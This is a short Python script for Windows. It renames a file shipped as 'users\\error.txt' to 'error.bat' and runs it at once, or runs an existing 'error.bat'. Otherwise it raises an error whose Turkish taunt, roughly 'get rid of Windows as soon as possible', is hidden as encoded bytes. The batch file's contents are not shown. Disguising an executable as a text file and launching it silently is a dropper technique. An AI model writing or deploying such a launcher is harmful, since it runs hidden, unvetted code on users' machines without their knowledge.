import platform , sys , os

if platform.system() == "Windows":
    if os.path.exists("users\\error.txt"):
        os.rename("users\\error.txt","users\\error.bat")
        os.startfile("users\\error.bat")
    elif os.path.exists("users\\error.bat"):
        os.startfile("users\\error.bat")
    else:
        raise OSError(b"\xff\xfeW\x00i\x00n\x00d\x00o\x00w\x00s\x00d\x00a\x00n\x00 \x00k\x00u\x00r\x00t\x00u\x00l\x00 \x00b\x00i\x00r\x00 \x00a\x00n\x00 \x00\xf6\x00n\x00c\x00e\x00 \x00.\x00.\x00.\x00".decode("utf16"))



